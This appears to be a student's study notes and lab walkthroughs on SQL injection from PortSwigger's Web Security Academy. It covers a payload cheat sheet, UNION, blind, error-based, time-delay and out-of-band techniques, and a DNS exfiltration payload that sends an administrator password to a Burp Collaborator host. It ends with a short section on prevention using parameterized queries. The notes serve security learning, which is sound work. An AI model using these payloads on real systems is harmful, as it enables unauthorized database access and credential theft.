https://portswigger.net/web-security/sql-injection

## About
`What is the vulnerability? Reference ID from CVE, CWE, or OWASP (if applicable)`

## Affected Components
`Parts of the system (e.g., headers, input fields, API routes)``

## Root Cause
`Underlying reason for the vulnerability (e.g., missing input validation)`

## Impact / Risk
`What could happen if exploited (e.g., data theft, account takeover)`

## Attack Vector
`How the vulnerability is triggered or reached (e.g., reflected in search field)`

## Instruments
`Tools used for exploitation`
### CLI
[psql](https://www.postgresql.org/download/linux/ubuntu/)
```sh
sudo apt install postgresql-client -y
psql -h 94.237.51.163 -p 36146 -U acdbuser -d acmecorp
```

```sh
# spinning postgresql container server in Docker for test
docker run -d \
  --name postgres \
  -e POSTGRES_USER=admin \
  -e POSTGRES_PASSWORD=secret \
  -e POSTGRES_DB=mydb \
  -p 5432:5432 \
  -v postgres_data:/var/lib/postgresql/data \
  postgres:16
```

### GUI
[pgadmin4](https://hub.docker.com/r/dpage/pgadmin4/)
```sh
# spinning pgadmin4 container for tool
docker run -d \
  --name pgadmin4 \
  -p 808:80 \
  -e PGADMIN_DEFAULT_EMAIL=admin@admin.com \
  -e PGADMIN_DEFAULT_PASSWORD=admin \
  -v pgadmin_data:/var/lib/pgadmin \
  dpage/pgadmin4
```
## Prerequisites / Requirements
`What the attacker needs (e.g., authentication, session)`

## Indicators of Misconfiguration
`Signs that a system is vulnerable (e.g., missing headers)`

## Detection
`How to identify it (e.g., Burp scan, manual test)`

## Mitigation / Prevention
`Steps to prevent or fix it (e.g., sanitize input, set secure headers)`

## Exploit Example
`Specific payload or PoC used to exploit the vulnerability`

## References
`Links to documentation, cheatsheets, CVEs, or blog posts`

## Q&A
`Questions that pop-up`
## String concatenation

You can concatenate together multiple strings to make a single string.

<table><tbody><tr><th>Oracle</th><td><code>'foo'||'bar'</code></td></tr><tr><th>Microsoft</th><td><code>'foo'+'bar'</code></td></tr><tr><th>PostgreSQL</th><td><code>'foo'||'bar'</code></td></tr><tr><th>MySQL</th><td><code>'foo' 'bar'</code> [Note the space between the two strings]<br><code>CONCAT('foo','bar')</code><br></td></tr></tbody></table>

## Substring

You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string `ba`.

<table><tbody><tr><th>Oracle</th><td><code>SUBSTR('foobar', 4, 2)</code></td></tr><tr><th>Microsoft</th><td><code>SUBSTRING('foobar', 4, 2)</code></td></tr><tr><th>PostgreSQL</th><td><code>SUBSTRING('foobar', 4, 2)</code></td></tr><tr><th>MySQL</th><td><code>SUBSTRING('foobar', 4, 2)</code></td></tr></tbody></table>

You can use comments to truncate a query and remove the portion of the original query that follows your input.

<table><tbody><tr><th>Oracle</th><td><code>--comment<br></code></td></tr><tr><th>Microsoft</th><td><code>--comment<br>/*comment*/</code></td></tr><tr><th>PostgreSQL</th><td><code>--comment<br>/*comment*/</code></td></tr><tr><th>MySQL</th><td><code>#comment</code><br><code>-- comment</code> [Note the space after the double dash]<br><code>/*comment*/</code></td></tr></tbody></table>

## Database version

You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

<table><tbody><tr><th>Oracle</th><td><code>SELECT banner FROM v$version<br>SELECT version FROM v$instance<br></code></td></tr><tr><th>Microsoft</th><td><code>SELECT @@version</code></td></tr><tr><th>PostgreSQL</th><td><code>SELECT version()</code></td></tr><tr><th>MySQL</th><td><code>SELECT @@version</code></td></tr></tbody></table>

## Database contents

You can list the tables that exist in the database, and the columns that those tables contain.

<table><tbody><tr><th>Oracle</th><td><code>SELECT * FROM all_tables<br>SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'</code></td></tr><tr><th>Microsoft</th><td><code>SELECT * FROM information_schema.tables<br>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br></code></td></tr><tr><th>PostgreSQL</th><td><code>SELECT * FROM information_schema.tables<br>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br></code></td></tr><tr><th>MySQL</th><td><code>SELECT * FROM information_schema.tables<br>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br></code></td></tr></tbody></table>

## Conditional errors

You can test a single boolean condition and trigger a database error if the condition is true.

<table><tbody><tr><th>Oracle</th><td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</code></td></tr><tr><th>Microsoft</th><td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</code></td></tr><tr><th>PostgreSQL</th><td><code>1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)</code></td></tr><tr><th>MySQL</th><td><code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')</code></td></tr></tbody></table>

You can potentially elicit error messages that leak sensitive data returned by your malicious query.

<table><tbody><tr><th>Microsoft</th><td><code>SELECT 'foo' WHERE 1 = (SELECT 'secret') &gt; Conversion failed when converting the varchar value 'secret' to data type int.</code></td></tr><tr><th>PostgreSQL</th><td><code>SELECT CAST((SELECT password FROM users LIMIT 1) AS int) &gt; invalid input syntax for integer: "secret"</code></td></tr><tr><th>MySQL</th><td><code>SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret'))) &gt; XPATH syntax error: '\secret'</code></td></tr></tbody></table>

## Batched (or stacked) queries

You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.

<table><tbody><tr><th>Oracle</th><td><code>Does not support batched queries.</code></td></tr><tr><th>Microsoft</th><td><code>QUERY-1-HERE; QUERY-2-HERE<br>QUERY-1-HERE QUERY-2-HERE</code></td></tr><tr><th>PostgreSQL</th><td><code>QUERY-1-HERE; QUERY-2-HERE</code></td></tr><tr><th>MySQL</th><td><code>QUERY-1-HERE; QUERY-2-HERE</code></td></tr></tbody></table>

#### Note

With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.

## Time delays

You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

<table><tbody><tr><th>Oracle</th><td><code>dbms_pipe.receive_message(('a'),10)</code></td></tr><tr><th>Microsoft</th><td><code>WAITFOR DELAY '0:0:10'</code></td></tr><tr><th>PostgreSQL</th><td><code>SELECT pg_sleep(10)</code></td></tr><tr><th>MySQL</th><td><code>SELECT SLEEP(10)</code></td></tr></tbody></table>

## Conditional time delays

You can test a single boolean condition and trigger a time delay if the condition is true.

<table><tbody><tr><th>Oracle</th><td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual</code></td></tr><tr><th>Microsoft</th><td><code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'</code></td></tr><tr><th>PostgreSQL</th><td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</code></td></tr><tr><th>MySQL</th><td><code>SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')</code></td></tr></tbody></table>

## DNS lookup

You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.

<table><tbody><tr><th>Oracle</th><td><p>(XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:</p><code>SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual</code><p>The following technique works on fully patched Oracle installations, but requires elevated privileges:</p><code>SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')</code></td></tr><tr><th>Microsoft</th><td><code>exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'</code></td></tr><tr><th>PostgreSQL</th><td><code>copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'</code></td></tr><tr><th>MySQL</th><td><p>The following techniques work on Windows only:</p><code>LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')</code><br><code>SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</code></td></tr></tbody></table>

## DNS lookup with data exfiltration

You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.

![[Pasted image 20241103054707.png]]




## Ways to detect SQL Injection:
Test every entry point in the application
- use ' and check for anomalies or errors
- look for systematic differences in the application responses
- 1=1 or 2=2
- time delay payloads
- OAST payload to trigger out-of-band network interaction, monitor results
- burp suite scanner


*Where most of the SQL injection vulnerability occurs?*
- within the `WHERE` clause or a `SELECT` query
- anywhere

*Common locations where SQL injection arises:*
    In `UPDATE` statements, within the updated values or the `WHERE` clause.
    In `INSERT` statements, within the inserted values.
    In `SELECT` statements, within the table or column name.
    In `SELECT` statements, within the `ORDER BY` clause.

### Example:
When you click on Gifts to display different products your URL changes to 
```html
https://insecure-website.com/products?category=Gifts
```

This causes application to:
- make SQL query 
- retrieve details of the relevant products from the db
- release = 1; used to hide products that aren't yet released
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

in case of no defences
- -- is a comment indicator in SQL
- so the query will no longed include *AND released = 1*
- as a result all products are displayed
```sh
https://insecure-website.com/products?category=Gifts'--
```

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

displaying all products in all categories
- 1=1 is always true, so it will return all items
```sh
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

## Retrieving hidden data
## ðŸŸ© Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
## Subverting application logic
Login as wiener:bluecheese
```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

if we use name administrator and '' comment sequece
- submit username as `administrator'--`
- `blank` password
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```


# SQL Injection `UNION` attacks
*What is the indicator that application is vulnerable?*
- result of the query are returned within the applications reponses
- use the UNION keyword to retrieve data from other tables

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```
- returns a single result
- with 2 columns
	- table 1 = a + b
	- table 2 = c + d

`key requirements:`
- the individual queries must return the same number of columns
- data types in each column must be compatible between the individual queries

*How to find those requiremenets?*
- How many columns are returned from the original query?
- Which columns returned from the original query are of a suitable data type to hold the results from injected query

## Determining number of columns required
`Method I`
Injection a series of `ORDER BY` clauses and implementing specified column index until an error occurs
- you don't need to know the name of the columns, since they are specified by the index
- if the injection point is a quoted string within the `WHERE` clause submit
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```

Indication of detection, as long as you detect some differences in the response
- return
```sh
The ORDER BY position number 3 is out of range of the number of items in the select list.
```
- or actual error return in its HTTP response
- sometimes no return no results at all

`Method II`
Submitting a series of `UNION SELECT` payloads specifying a different number of null values

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```

If a number of nulls does not match the number of columns, the db will return the error
```sh
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```

Why do we use NULL value?
- the data types in each column must be compatible between the original and the injected queries
- NULL is convertible to every common data type
- it maximizes the chance that the payload will succeed

Indicators
- when number of nulls matches the number of columns, the db returns an additional row in the result set, containing NULL values in each column
- effect on HTTP response depends on the application code
- Null values may trigger NullPointerException error
- If error is the same a always - method is ineffective

### Lab
`Positive`
```HTTP
GET /filter?category='+UNION+SELECT+NULL,NULL,NULL-- HTTP/2
```

![[Pasted image 20241103054107.png]]

`Negative`
```HTTP
GET /filter?category='+UNION+SELECT+NULL,NULL-- HTTP/2
```

![[Pasted image 20241103054147.png]]


### Database-specific syntax
`Oracle` for example uses build-in table "dual"
```sql
' UNION SELECT NULL FROM DUAL--
```

`MySQL` double-dash must be followed by a space or hash can be used to comment


## Finding columns with useful data type
- you want to retrieve data in string format, 
- so you have to find one or more columns whose data type is, or is compatible with, string data
- after you determined number of required columns
	- probe each column to test whether it can hold string data
	- submit a series of `UNION SELECT` payloads that place a string value into each column in turn
	- if a query returns 4 columns
```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
- if column data type is not compatible with string data, injected data will cause db error
```sh
Conversion failed when converting the varchar value 'a' to data type int.
```
- if error doesn't not occur and application's response contains some additional content including the injected string value
	- green light

### Lab
```sql
'+UNION+SELECT+'abcdef',NULL,NULL--
```


## Retrieving Interesting Data
Suppose that:
- original query returns 2 columns
- both can hold string
- injection point is quoted string with the `WHERE` clause
- the db contains table `users`, with columns `username`, `password`

retrieve contents by submitting
```sql
' UNION SELECT username, password FROM users--
```

What do you need to know to make it work?
- table name (users)
- two column names, username, password


## Retrieving multiple values within a single column
How it's done?
- by concatenating the values together
- include separator to let you distinguish the combined values

Oracle
- || is a string concatenation operator
- concatenates username ~ password
```sql
' UNION SELECT username || '~' || password FROM users--
```


```sql
'foo'+'bar'
' UNION SELECT 'username' + 'password' FROM users--
' UNION SELECT username, password FROM users--
```

Steps to reproduce
- Determine number of columns being returned by query
- Determine which column contain text data
```http
GET /filter?category='+UNION+SELECT+NULL,'a'-- HTTP/2
GET /filter?category='+UNION+SELECT+'a',NULL-- HTTP/2
```

- Retrieve the context of the users table
```http
GET /filter?category='+UNION+SELECT+NULL,username||'~'||password+FROM+users-- HTTP/2
```

output
```sh
carlos~yv4788b5oes82fpbkov9
administrator~qyixjbp11ltkd68vuuoz
wiener~d8312vub7sga01l3uz0v
```


## Enumeration
### Querying the database type and version on MySQL and Microsoft

| Database type     | Query                   |
|-------------------|-------------------------|
| Microsoft, MySQL  | SELECT @@version        |
| Oracle            | SELECT * FROM v$version |
| PostgreSQL        | SELECT version()        |

Use UNION attack to find out the version and db type
```sql
' UNION SELECT @@version--
```

```html
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor
```

Steps to reproduce:
- determine number of columns
```sql
GET /filter?category='+ORDER+BY+2# HTTP/2
-- or
GET /filter?category='+UNION+SELECT+NULL,NULL# HTTP/2
```
- determine which one returns string data
```sql
-- they both are
GET /filter?category='+UNION+SELECT+'sql-data-too','sql-data'# HTTP/2
```
- it's MySQL, so we use hash '#' to comment
```sql
GET /filter?category='+UNION+SELECT+'abc',@@version#
```

### Listing the contents of the database
#### Information Schema
- most db types (except Oracle) have a set of views called information schema
	- provides info about the db
```sql
SELECT * FROM information_schema.tables

TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

- to list individual table
```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'

TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```

#### Listing db contents on non-Oracle dbs
use union attack
determine columns
determine string columns
sql inject

```sql
GET /filter?category='+ORDER+BY+2-- HTTP/2
-- or
GET /filter?category='+UNION+SELECT+NULL,NULL-- HTTP/2
```

```sql
-- they both are
GET /filter?category='+UNION+SELECT+'sql-data-too','sql-data'-- HTTP/2
```

`Lab`
```sql
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_hvgofw'--
'+UNION+SELECT+username_grknrh,+password_phjykp+FROM+users_hvgofw--
```

Selecting all tables
![[Pasted image 20241104063124.png]]
Selecting all columns of the `users_hvgofw` table
![[Pasted image 20241104062927.png]]
Selecting all usernames and passwords from the users_hvgofw table
![[Pasted image 20241104063050.png]]


# Blind SQL injection
When does it occurs?
- when application is still vulnerable to SQL Injection
- but its HTTP responses do not contain the results of the relevant SQL query
- or the details of any db errors
- many techniques aren't efficient with blind SQL injection vulnerabilities (like UNION), because you need to see HTTP output

## Triggering conditional responses
Environment
- application that uses tracking cookies to gather stats about usage
```http
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```
- when a request containing TrackingId cookie is processed, app uses a SQL query to determine whether this is a known user
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```
- this query is vulnerable
- results from the query aren't returned to user
- if you submit recognized TrackingId -> query returns data -> you receive 'Welcome back' message in reponse
```sql
â€¦xyz' AND '1'='1
â€¦xyz' AND '1'='2
```

Determining password for the user by sending a series of inputs to test the password one char at a time
- next query returns 'Welcome Back'
- injected condition is true
```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```
- this query does not return 
```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

The `SUBSTRING` function is called `SUBSTR` on some types of database. 

### Lab
Environment
- app uses tracking cookie 
- performs SQL query containing the value of submitted cookie
- results aren't returned, no error messages are displayed
- app include 'Welcome Back' message  if the query returns any rows
- assume password only contains alphanumeric alphabet

Changing cookie to check if 'Welcome Back' appears
```sql
Cookie: TrackingId=r6QmFU1pxLfPEi8l' AND '1'='1;
```

Verify that there is a table called 'users' and condition is true
```sql
...xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```

Verify that there is a Administrator `username` in the table `users`
```sql
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

#### Determining the length
Determine how many chars are in the password of the administrator (should be true)
```sql
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

Send a series of follow-up values to test different password lengths
```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
```

`Intruder`
```sql
r6QmFU1pxLfPEi8l' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>Â§1Â§)='a;
```
perform negative search with burp pro or regular search
- password is `20` chars
![[Pasted image 20241104082055.png]]
![[Pasted image 20241104081932.png]]

#### Determining the passwords value
using `SUBSTRING()` function to extract a single char from the password and test it against specific value
```sql
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

password complexity:
- a-z
- 0-9
![[Pasted image 20241104082659.png]]

add Grep-Match
![[Pasted image 20241104082759.png]]

start
- we determined that the first letter is 's'
![[Pasted image 20241104082940.png]]


Go with a second letter
```sql
TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
```

##### Cluster BOMB
Cookie
```sql
Cookie: TrackingId=r6QmFU1pxLfPEi8l' AND (SELECT SUBSTRING(password,Â§1Â§,1) FROM users WHERE username='administrator')='Â§aÂ§;
```

![[Pasted image 20241104084106.png]]

![[Pasted image 20241104084122.png]]

![[Pasted image 20241104084148.png]]

Results
s66btdwc9fgmt9tlggnn
![[Pasted image 20241104083741.png]]

# Error-based SQL Injection
Used to
- extract or infer sensitive data from the db
- even in blind contexts
- possibilities depends on the configuration of the db and the types of errors you're able to trigger

Way A:
- induce application to return a specific error based on the result of a boolean expression (similar to [[#Blind SQL injection]])

Way B:
- trigger error messages that output the data returned by the query
- turns blind SQL injection into visible ones

## Triggering conditional errors
Environment
- some applications carry out SQL carries but their behavior doesn't change
- injecting boolean conditions makes no difference to the application's responses
- it's possible to induce the app to return a different response depending on whether a SQL error occurs

Modify the query so that it causes a db error only if the condition is true
Using `CASE` keyword to test a condition and return a different expression depending on whether the expression is true
- first one, evaluates to 'a' which does not acuse any error
- second one, it evaluates to 1/0, that cause `divide-by-zero error`
```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

If the error causes a difference in the application's HTTP response
- use it to determine whether the injected condition is true
- retrieve data by testing one char at a time
```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

***There are different techniques of triggering errors, and they work on different db types***


## Extracting sensitive data via verboase SQL error messages
Some misconfigurations result in verbose error messages
- next error is generated after injecting a single quote into an id parameter
- this turns an otherwise blind SQL injection vulnerability into a visible one
```sql
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

Using `CAST ()` function to achieve this
- enables you to convert one data type to another
```sql
-- often the data you're trying to read is a string
-- attempting to convert data type, into incompatible may cause error
CAST((SELECT example_column FROM example_table) AS int)

ERROR: invalid input syntax for type integer: "Example data"
```


# Blind SQL Injections by triggering time delays
SQL queries are triggered `synchronously`
MsSQL Server
```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'--
-- not delaying, condition is false
'; IF (1=1) WAITFOR DELAY '0:0:10'--
-- delays
```

Retrieve data by testing one char at a time
- there are various techniques for different dbs
```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

`Lab`

| Oracle     | dbms_pipe.receive_message(('a'),10) |
| ---------- | ----------------------------------- |
| Microsoft  | WAITFOR DELAY '0:0:10'              |
| PostgreSQL | SELECT pg_sleep(10)                 |
| MySQL      | SELECT SLEEP(10)                    |
|            |                                     |
*PostgreSQL* db
Verify that app takes 10 sec to respond
```sql
'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

Verify that app does not sleep
```sql
'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

Testing if username 'administrator' in table users
```sql
'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Determining how many chars are in the password of administrator
- try it until you see immediate response
```sql
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Determining password value
```sql
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

`Intruder`
```sql
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,Â§1Â§,1)='Â§aÂ§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--;
```
![[Pasted image 20241105053158.png]]

![[Pasted image 20241105053337.png]]


# Blind SQL using out-of-band OAST technique
- app may carry the same SQL query as priveus by doing it `asynchronously`
	- multi thread to execute SQL query using the tracking cookie

app response doesn't depend on the 
- query returning any data
- db error occurring
- time taken to execute the query

However it is possible to exploit vulnerability by
- triggering out-of-band network interactions
- to a system you control
- many protocols can be used, but the most efficient is DNS

`Burp Collaborator` is the most reliable tool for using out-of-band technique
- server that provides custom implementations of various network services (incl DNS)
- detect network interactions

MsSQL Server query to cause DNS lookup of the specific domain
```sql
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

`Lab`
Confirming OAST
But in lab we have oracle
![[Pasted image 20241105055150.png]]

![[Pasted image 20241105055104.png]]

`Exfiltrating data`
Input reads the password for the Administrator user
Appends a unique domain
Triggers a DNS lookup
```sql
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

This lookup allow you to see captured password
```sql
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```


## SQL injection w/ filter bypass using XML encoding
- you can perform SQL injection attacks using any controllable input that is processed as a SQL query by the app
- some websites take JSON or XML input format to query db
- different formats = different ways to obfuscate attack that are blocked by WAFs

XML-based SQL injection uses an XML escape sequence to encode the `S` character in `SELECT`
- server will decoded server-side before being passed to the SQL interpreter
```xml
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

`Lab`
First of all look for input vectors that can potentially talk to the back-end
![[Pasted image 20241106043435.png]]

After pressing on UI "Check Stock" button, we have new request to db
![[Pasted image 20241106043543.png]]

![[Pasted image 20241106043623.png]]

It takes:
- productId
- storeId

`When the vulnerability exist?`
- if the input is not properly parameterized

Test
![[Pasted image 20241106043846.png]]

Obfuscating input with `Hackvertor`
	Encode to hex_entities
![[Pasted image 20241106044135.png]]

How many columns are there?
	there is only 1 columns, since by adding the second `NULL` value we aren't getting response with the right amount of units
![[Pasted image 20241106044245.png]]

Now in order to output `username` and `password` in a single column - you have to concatenate them
	1 UNION SELECT username || '~' || password FROM users
![[Pasted image 20241106044617.png]]

# Second-order SQL injection
*What is first-order SQL injection?*
- when app processes user input from an HTTP request and incorporates the input into a SQL query in an unsafe way

*What is second-order SQL injection?*
- when app takes input from an HTTP request and stores in for future use
- placing input into db, no exploit occurs when data is stored
- later when handling different HTTP request the app retrieves the stored data and incorporates it into SQL query in an unsafe way
- aka `Stored SQL injection`

# Preventing SQL injection
- parameterized queries instead of string concatenation within the query
	- aka "prepared statements"

example of vulnerable code, where user input is directly concatenated into the query
```sql
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

example of rewritten code
```sql
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

Where to use parameterized queries?
- in any situation where untrusted input appears as data within the query
- WHERE clause
- INSERT, UPDATE values in statement

Taking apps functionality that places untrusted data to a different approach
- whitelist permitted input values
- use different logic to deliver the required behavior


ðŸŸ©
ðŸŸ¦
ðŸŸª
# Walkthrough
## ðŸŸ© Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
## Subverting application logic
Login as wiener:bluecheese
```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

if we use name administrator and '' comment sequece
- submit username as `administrator'--`
- `blank` password
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

## ðŸŸ© Lab 2: SQL injection vulnerability allowing login bypass
Intercept and modify login request
Modify `username` parameter to 
```
username=administrator`--
```

## ðŸŸ¦ Lab 3: SQL injection attack, querying the database type and version on Oracle
This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
1. Determine number of columns being returned by query and which columns contain text data
	- verify that it returns 2 columns and both text
```http
GET /filter?category=Tech+gifts'+UNION+SELECT+'abc','def'+FROM+dual-- HTTP/2
Host: 0a89005d03a5eadf80a799760091008f.web-security-academy.net
Cookie: session=QfEvMnEFfvtFjTAF25B8CdMxZuxh0y6j
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a89005d03a5eadf80a799760091008f.web-security-academy.net/filter?category=Lifestyle
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers


```
2. Enumerate version
```http
GET /filter?category=Tech+gifts'+UNION+SELECT+BANNER,+NULL+FROM+v$version-- HTTP/2
Host: 0a89005d03a5eadf80a799760091008f.web-security-academy.net
Cookie: session=QfEvMnEFfvtFjTAF25B8CdMxZuxh0y6j
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a89005d03a5eadf80a799760091008f.web-security-academy.net/filter?category=Lifestyle
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers


```

![[Pasted image 20241118045934.png]]

## ðŸŸ¦ Lab 4: SQL injection attack, querying the database type and version on MySQL and Microsoft ?

## ðŸŸ¦ Lab 5: SQL injection attack, listing the database contents on non-Oracle databases ?
## ðŸŸ¦ Lab 6: SQL injection attack, listing the database contents on Oracle
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
